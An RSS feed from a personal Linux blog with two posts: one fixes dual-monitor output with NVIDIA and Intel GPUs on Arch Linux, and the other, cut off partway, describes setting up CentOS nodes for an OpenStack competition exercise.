<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>Linux - Tag - WeepingDogel</title>
        <link>http://weepingdogel.github.io/tags/linux/</link>
        <description>Linux - Tag - WeepingDogel</description>
        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Thu, 21 Sep 2023 16:25:47 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/linux/" rel="self" type="application/rss+xml" /><item>
    <title>Solve the problem of dual screen with NVIDIA and Intel GPUs</title>
    <link>http://weepingdogel.github.io/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/</link>
    <pubDate>Thu, 21 Sep 2023 16:25:47 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2023-09-21-21-49-12%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h2 id="introduction">Introduction</h2>
<p>Recently I bought a new monitor made by ViewSonic, but I meet some problems of the dual GPUs.</p>
<p>In the past years, I have used only one screen which is installed in my laptop without NVIDIA graphcial drivers. (Only use the Intel core GPU).</p>
<p>However, because of the new monitor added, the ntegrated graphics is not powerful enough to output two screens.</p>
<p>Therefore, I decide to install the NVIDIA grapcial driver of the RTX3050 on my Arch Linux in order to make use of the Discrete Graphics Card to output the new screen.</p>
<p>But things are not running well&hellip;</p>
<p>The reason why I crashed the wall is that I used to running Gnome on wayland mode before.</p>
<p>But it is said that NVIDIA drivers are not performing well on wayland?</p>
<p>So it truly means that I have to abandon the idea to output two screen on wayland.</p>
<p>Oh it&rsquo;s bad! I have to come back to the hugging of the X11!</p>
<h2 id="beginning">Beginning</h2>
<p>At the beginning of that, I plugged the miniDP into the laptop and the another port into the monitor.</p>
<p>But disappointingly, it can&rsquo;t be lighted up at all. QAQ.</p>
<p>Maybe the miniDP port can not output anything because of missing the NVIDIA driver.</p>
<p>So I have to install it.</p>
<h2 id="installation-of-the-nvidia-drivers">Installation of the NVIDIA drivers</h2>
<p>The first step is to install the drivers. Yeah notefuly, it&rsquo;s the first step, not the last.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ sudo pacman -S nvidia nvidia-utils lib32-nvidia-utils nvidia-prime
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, the screen was still not displaying anything&hellip;</p>
<p>Then I went to the Arch Linux CN group to ask the guys in community.</p>
<p>After discussion, I finally got the solution.</p>
<h2 id="open-the-ibt">Open the <code>ibt</code></h2>
<p>About on the March, <a href="/en/posts/problem_of_virtualbox_appeding_starting_vm/" rel="">I faced a problem of VirutalBox and set the <code>ibt=off</code></a>.</p>
<p>But now it is not required to be <code>off</code>, I need to remove the param of the kernel.</p>
<p>Edit the file: <code>/etc/default/grub</code>,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo vim /etc/default/grub
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GRUB_DEFAULT=&#34;0&#34;
</span></span><span class="line"><span class="cl">GRUB_TIMEOUT=&#34;100&#34;
</span></span><span class="line"><span class="cl">GRUB_DISTRIBUTOR=&#34;Arch&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX_DEFAULT=&#34;quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX=&#34;ibt=off&#34;
</span></span><span class="line"><span class="cl">.........
</span></span></code></pre></td></tr></table>
</div>
</div><p>then remove the <code>ibt=off</code> in <code>GRUB_CMD_LINE_LINUX</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GRUB_DEFAULT=&#34;0&#34;
</span></span><span class="line"><span class="cl">GRUB_TIMEOUT=&#34;100&#34;
</span></span><span class="line"><span class="cl">GRUB_DISTRIBUTOR=&#34;Arch&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX_DEFAULT=&#34;quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0&#34;
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX=&#34;&#34;
</span></span><span class="line"><span class="cl">.........
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then regenerate the <code>grub.cfg</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo grub-mkconfig -o /etc/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="set-nvidia-modeset">Set NVIDIA modeset</h2>
<p>Then I need to check the value of the <code>nvidia-drm.modeset</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /sys/module/nvidia_drm/parameters/modeset
</span></span></code></pre></td></tr></table>
</div>
</div><p>It shows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">N
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now I need to add <code>nvidia-drm.modeset=1</code> into Kernel Paramaters.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Explanation from ChatGPT<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The <code>nvidia-drm.modeset=1</code> kernel parameter enables the <strong>NVIDIA Direct Rendering Manager KMS (Kernel Mode Setting)</strong>. KMS is a method for setting display resolution and depth in the kernel space rather than user space.</div>
        </div>
    </div>
<p>Edit the file: <code>/etc/default/grub</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo vim /etc/default/grub
</span></span></code></pre></td></tr></table>
</div>
</div><p>Add the <code>nvidia-drm.modeset=1</code> into <code>GRUB_CMDLINE_LINUX_DEFAULT</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">........
</span></span><span class="line"><span class="cl">GRUB_CMDLINE_LINUX_DEFAULT=&#34;quiet splash loglevel=3 rd.udev.log_priority=3 vt.global_cursor_default=0 nvidia-drm.modeset=1&#34;
</span></span><span class="line"><span class="cl">........
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then regenerate the grub configuration file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo grub-mkconfig -o /boot/grub/grub.cfg
</span></span></code></pre></td></tr></table>
</div>
</div><p>And reboot.</p>
<h2 id="use-mutter-performance">Use mutter-performance</h2>
<p>Still, it&rsquo;s not performing well after restarting the system.</p>
<p>For this reason, it should be a bit better to use the <code>mutter-performance</code>.</p>
<div class="details admonition tip open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Explanation from ChatGPT<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><code>mutter-performance</code> is an optimized version of the Mutter window manager, particularly tweaked for performance. Mutter is the default window manager for GNOME 3, which is responsible for arranging, interacting with, and animating windows <a href="https://www.linkedin.com/company/mutter-performance/" target="_blank" rel="noopener noreffer">linkedin.com</a>.</div>
        </div>
    </div>
<p>This package should be installed from <a href="https://aur.archlinux.org" target="_blank" rel="noopener noreffer">AUR</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ paru -S mutter-performance
</span></span></code></pre></td></tr></table>
</div>
</div><p>After installation, the desktop truly ran a little faster, but it&rsquo;s still not enough.</p>
<p>And by the way, it&rsquo;s time to remove the <code>xf86-video-intel</code>. It is not required in new devices.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo pacman -Rs xf86-video-intel
</span></span></code></pre></td></tr></table>
</div>
</div><div class="details admonition tip">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-lightbulb fa-fw"></i>Explanation from ChatGPT<i class="details-icon fas fa-angle-right fa-fw"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>The xf86-video-intel package is a driver for Intel integrated graphics chips that is maintained by the X.Org project. However, for modern Intel graphics hardware (roughly 2007 and newer), it is often recommended to remove this package for several reasons:</p>
<p>Better support with modesetting driver: The modesetting driver, which is part of the X server and does not need to be installed separately, has better support for modern graphics features and hardware. It is maintained by the X.Org project and tends to keep up with new developments in graphics technology github.com.</p>
<p>Issues with xf86-video-intel driver: The xf86-video-intel driver has been known to cause issues on some systems, including graphical glitches and poorer performance compared to the modesetting driver. In some cases, it can even lead to system instability bbs.archlinux.org.</p>
<p>Lack of active development: The xf86-video-intel driver has not seen active development for several years, which means it may lack support for features found in newer hardware and software. On the other hand, the modesetting driver is actively developed as part of the X server reddit.com.</p>
<p>To remove the xf86-video-intel package, you can use the package manager of your specific Linux distribution. Here&rsquo;s an example using pacman, the package manager for Arch Linux:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo pacman -R xf86-video-intel
</span></span></code></pre></td></tr></table>
</div>
</div><p>After removing the package, restart your system to ensure the changes take effect.</p>
<p>Remember to check the documentation of your specific distribution for the correct way to remove packages and handle drivers.</p>
</div>
        </div>
    </div>
<h2 id="set-x-11-configuration">Set X-11 Configuration</h2>
<p>According to the <a href="https://wiki.archlinux.org/title/NVIDIA_Optimus#Use_NVIDIA_graphics_only" target="_blank" rel="noopener noreffer">Arch Wiki</a>, I need to set some X-11 Configuration, intending to use the NVIDIA graphics only.</p>
<p>Write in the file <code>/etc/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf/</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Section &#34;OutputClass&#34;
</span></span><span class="line"><span class="cl">    Identifier &#34;intel&#34;
</span></span><span class="line"><span class="cl">    MatchDriver &#34;i915&#34;
</span></span><span class="line"><span class="cl">    Driver &#34;modesetting&#34;
</span></span><span class="line"><span class="cl">EndSection
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Section &#34;OutputClass&#34;
</span></span><span class="line"><span class="cl">    Identifier &#34;nvidia&#34;
</span></span><span class="line"><span class="cl">    MatchDriver &#34;nvidia-drm&#34;
</span></span><span class="line"><span class="cl">    Driver &#34;nvidia&#34;
</span></span><span class="line"><span class="cl">    Option &#34;AllowEmptyInitialConfiguration&#34;
</span></span><span class="line"><span class="cl">    Option &#34;PrimaryGPU&#34; &#34;yes&#34;
</span></span><span class="line"><span class="cl">    ModulePath &#34;/usr/lib/nvidia/xorg&#34;
</span></span><span class="line"><span class="cl">    ModulePath &#34;/usr/lib/xorg/modules&#34;
</span></span><span class="line"><span class="cl">EndSection
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then I need to create two <code>*.desktop</code> files to configure the GDM.</p>
<p>Write in <code>/usr/share/gdm/greeter/autostart/optimus.desktop</code> and <code>/etc/xdg/autostart/optimus.desktop</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[Desktop Entry]
</span></span><span class="line"><span class="cl">Type=Application
</span></span><span class="line"><span class="cl">Name=Optimus
</span></span><span class="line"><span class="cl">Exec=sh -c &#34;xrandr --setprovideroutputsource modesetting NVIDIA-0; xrandr --auto&#34;
</span></span><span class="line"><span class="cl">NoDisplay=true
</span></span><span class="line"><span class="cl">X-GNOME-Autostart-Phase=DisplayServer
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, I rebooted and fixed the problem.</p>
<p>Yay!</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.phind.com" target="_blank" rel="noopener noreffer">Phind.com</a></li>
<li><a href="https://wiki.archlinux.org/title/NVIDIA_Optimus#Use_NVIDIA_graphics_only" target="_blank" rel="noopener noreffer">NVIDIA Optimus - ArchWiki #Use_NVIDIA_graphics_only</a></li>
<li><a href="https://wiki.archlinux.org/title/NVIDIA_Optimus#GDM" target="_blank" rel="noopener noreffer">NVIDIA Optimus - ArchWiki #GDM</a></li>
</ul>
]]></description>
</item><item>
    <title>Attempted solution to the OpenStack Provincial Competition problem (Part One: Installation)</title>
    <link>http://weepingdogel.github.io/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/</link>
    <pubDate>Thu, 04 May 2023 16:37:32 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/attempted_solution_to_the_openstack_provincial_competition_problem_part1/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/2023-05-04-17-14-22%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be.png" referrerpolicy="no-referrer">
            </div><h2 id="introduction">Introduction</h2>
<p>As you know, I have been fortunate enough to be selected by my instructors to participate in the provincial cloud computing competition. As a result, I have joined the project group in campus.</p>
<p>As a member of the group, I need to study hard and continuously expand my knowledge. To achieve good results at the upcoming provincial competition, we need to learn about the structure of private clouds and the different types of container clouds.</p>
<p>One suggested option for a private cloud solution is <strong>OpenStack</strong>, which can be complex and require significant effort to master.</p>
<p>However, I am still motivated to pursue this technology as I have a strong interest in IT and Linux-related topics, and I believe that the challenge of learning OpenStack will ultimately improve my knowledge and skills.</p>
<p>Therefore, I made a decision to write some articles on my blog site to document my study process.</p>
<h2 id="preparation">Preparation</h2>
<h3 id="nodes">Nodes</h3>
<p>At first of the first, I need to understand a basic example structrue of the OpenStack.</p>
<p>Without doubt, this picture below is a reasonable and official one.</p>
<p></p>
<p>However, limited by the performance and small disk storage, I can only create mainly <strong>2</strong> nodes and <strong>an extra resource node to provide the images and repos</strong>.</p>
<p>I won&rsquo;t create independent <strong>Object Storage Node</strong> and <strong>Block Storage Node</strong> while it&rsquo;s a better choice to add 2 extra virtual disks to the Compute Node.</p>
<p>And for the <strong>Cinder Service</strong>, I will only provide <strong>1</strong> disk with <strong>2</strong> partitions to run the service.</p>
<p>The details of my VirutalBox properties is blow:</p>
<p>
</p>
<p>By the way, I have to explain the Arch VM, it&rsquo;s only a resource node to provide the HTTP downloading and <code>yum</code> repo service.</p>
<p>So I just use <strong>256MB RAM and 1 core</strong>, but <strong>2</strong> disks to storage the multiple and large repo files.</p>
<p></p>
<h3 id="network">Network</h3>
<h4 id="network-interfaces">Network Interfaces</h4>
<p>In order to set up the OpenStack Services, each node (compute and controller) need to use 2 network interfaces.</p>
<p>The first one is used to connect to the <strong>Management NetWork</strong> while the second one is used to connect the <strong>Operation Network</strong>.</p>
<table>
<thead>
<tr>
<th style="text-align:center">Network Interface</th>
<th style="text-align:center">Network</th>
<th style="text-align:center">Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">enp0s3</td>
<td style="text-align:center">192.168.56.0/24</td>
<td style="text-align:center">Management NetWork</td>
</tr>
<tr>
<td style="text-align:center">enp0s8</td>
<td style="text-align:center">172.129.1.0/24</td>
<td style="text-align:center">Operation Network</td>
</tr>
</tbody>
</table>
<h4 id="nodes-ip-address">Nodes IP Address</h4>
<p>So the detail netowrk properties is below:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Node</th>
<th style="text-align:center">Management Address</th>
<th style="text-align:center">Operation Address</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">controller</td>
<td style="text-align:center">192.168.56.2</td>
<td style="text-align:center">172.129.1.1</td>
</tr>
<tr>
<td style="text-align:center">compute</td>
<td style="text-align:center">192.168.56.3</td>
<td style="text-align:center">172.129.1.2</td>
</tr>
<tr>
<td style="text-align:center">Resource</td>
<td style="text-align:center">192.168.56.100</td>
<td style="text-align:center">None</td>
</tr>
</tbody>
</table>
<h3 id="operating-system">Operating System</h3>
<p>CentOS will be installed in the controller and compute and the Arch Linux will be installed in Resouce.</p>
<table>
<thead>
<tr>
<th style="text-align:center">Node</th>
<th style="text-align:center">OS</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">controller</td>
<td style="text-align:center">CentOS 7</td>
</tr>
<tr>
<td style="text-align:center">compute</td>
<td style="text-align:center">CentOS 7</td>
</tr>
<tr>
<td style="text-align:center">Resource</td>
<td style="text-align:center">Arch Linux</td>
</tr>
</tbody>
</table>
<h4 id="set-up-the-network">Set up the network</h4>
<p>Edit the file <code>/etc/sysconfig/network-scripts/ifcfg-enp0s3</code> and <code>/etc/sysconfig/network-scripts/ifcfg-enp0s8</code> on each nodes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># vim /etc/sysconfig/network-scripts/ifcfg-enp0s3
</span></span><span class="line"><span class="cl"># vim /etc/sysconfig/network-scripts/ifcfg-enp0s8
</span></span></code></pre></td></tr></table>
</div>
</div><p>And Edit the file according to the sheet.</p>
<p>For example, the controller node is below:</p>
<p><code>/etc/sysconfig/network-scripts/ifcfg-enp0s3</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TYPE=Ethernet
</span></span><span class="line"><span class="cl">PROXY_METHOD=none
</span></span><span class="line"><span class="cl">BROWSER_ONLY=no
</span></span><span class="line"><span class="cl">BOOTPROTO=static
</span></span><span class="line"><span class="cl">DEFROUTE=yes
</span></span><span class="line"><span class="cl">IPADDR=192.168.56.2
</span></span><span class="line"><span class="cl">GATEWAY=192.168.56.1
</span></span><span class="line"><span class="cl">PREFIX=24
</span></span><span class="line"><span class="cl">IPV4_FAILURE_FATAL=no
</span></span><span class="line"><span class="cl">IPV6INIT=yes
</span></span><span class="line"><span class="cl">IPV6_AUTOCONF=yes
</span></span><span class="line"><span class="cl">IPV6_DEFROUTE=yes
</span></span><span class="line"><span class="cl">IPV6_FAILURE_FATAL=no
</span></span><span class="line"><span class="cl">IPV6_ADDR_GEN_MODE=stable-privacy
</span></span><span class="line"><span class="cl">NAME=enp0s3
</span></span><span class="line"><span class="cl">UUID=d59932b3-b22e-4d55-893d-cdeb847bd619
</span></span><span class="line"><span class="cl">DEVICE=enp0s3
</span></span><span class="line"><span class="cl">ONBOOT=yes
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>/etc/sysconfig/network-scripts/ifcfg-enp0s8</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TYPE=Ethernet
</span></span><span class="line"><span class="cl">PROXY_METHOD=none
</span></span><span class="line"><span class="cl">BROWSER_ONLY=no
</span></span><span class="line"><span class="cl">BOOTPROTO=static
</span></span><span class="line"><span class="cl">DEFROUTE=yes
</span></span><span class="line"><span class="cl">IPADDR=172.129.1.1
</span></span><span class="line"><span class="cl">PREFIX=24
</span></span><span class="line"><span class="cl">IPV4_FAILURE_FATAL=no
</span></span><span class="line"><span class="cl">IPV6INIT=yes
</span></span><span class="line"><span class="cl">IPV6_AUTOCONF=yes
</span></span><span class="line"><span class="cl">IPV6_DEFROUTE=yes
</span></span><span class="line"><span class="cl">IPV6_FAILURE_FATAL=no
</span></span><span class="line"><span class="cl">IPV6_ADDR_GEN_MODE=stable-privacy
</span></span><span class="line"><span class="cl">NAME=enp0s8
</span></span><span class="line"><span class="cl">UUID=b02be511-361b-447f-b670-282850bce1f5
</span></span><span class="line"><span class="cl">DEVICE=enp0s8
</span></span><span class="line"><span class="cl">ONBOOT=yes
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="start-ssh-service">Start ssh service</h4>
<p>Start sshd on each nodes.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># systemctl start sshd &amp;&amp; systemctl enable sshd
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="quiz">Quiz</h2>
<h3 id="task-1-building-private-cloud-services-105-points">[Task 1] Building Private Cloud Services [10.5 points]</h3>
<blockquote>
<h4 id="question-1-basic-environment-configuration-05-points"><strong>[Question 1] Basic environment configuration [0.5 points]</strong></h4>
<p>Using the provided username and password, log in to the provided OpenStack private cloud platform. Under the current tenancy, create two virtual machines using the CentOS7.9 image and 4vCPU/12G/100G_50G type. The second network card should be created and connected to both the controller and compute nodes (the second network card&rsquo;s subnet is <code>10.10.X.0/24</code>, where X represents the workstation number, and no routing is needed). Verify the security group policies to ensure normal network communication and ssh connection, and configure the servers as follows:</p>
<ol>
<li>Set the hostname of the control node to &lsquo;controller&rsquo; and that of the compute node to &lsquo;compute&rsquo;;</li>
<li>Modify the hosts file to map IP addresses to hostnames.</li>
</ol>
<p>After completing the configuration, submit the username, password, and IP address of the control node in the answer box.</p>
</blockquote>
<p>The first quiz is eazy, just some steps can be done.</p>
<p>At the controller Node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# hostnamectl set-hostname controller
</span></span></code></pre></td></tr></table>
</div>
</div><p>At the compute Node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# hostnamectl set-hostname compute
</span></span></code></pre></td></tr></table>
</div>
</div><p>Edit the file <code>/etc/hosts</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# vim /etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>Write these:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
</span></span><span class="line"><span class="cl">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
</span></span><span class="line"><span class="cl">192.168.56.100 Resource
</span></span><span class="line"><span class="cl">192.168.56.2 controller
</span></span><span class="line"><span class="cl">192.168.56.3 compute
</span></span></code></pre></td></tr></table>
</div>
</div><p>Save it by <code>:wq</code>.</p>
<p>Then send it to compute Node by <code>scp</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# scp /etc/hosts root@compute:/etc/hosts
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, all the operation is complete.</p>
<blockquote>
<h4 id="question-2-yum-repository-configuration-05-points"><strong>[Question 2] Yum Repository Configuration [0.5 points]</strong></h4>
<p>Using the provided <em><strong>HTTP service address</strong></em>, there are <code>CentOS 7.9</code> and <code>IaaS network YUM repositories</code> available under the HTTP service. Use this HTTP source as the network source for installing the IaaS platform. Set up the yum source file http.repo for both the controller node and compute node. After completion, submit the username, password, and IP address of the control node to the answer box.</p>
</blockquote>
<p>Well, it&rsquo;s still a easy question.</p>
<p>First, delete the old repo files in two nodes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# rm -rfv /etc/yum.repos.d/*
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# rm -rfv /etc/yum.repos.d/*
</span></span></code></pre></td></tr></table>
</div>
</div><p>Second, according to the question, we should create and edit a file named after <code>http.repo</code>.</p>
<div class="highlight"><div class="chroma">
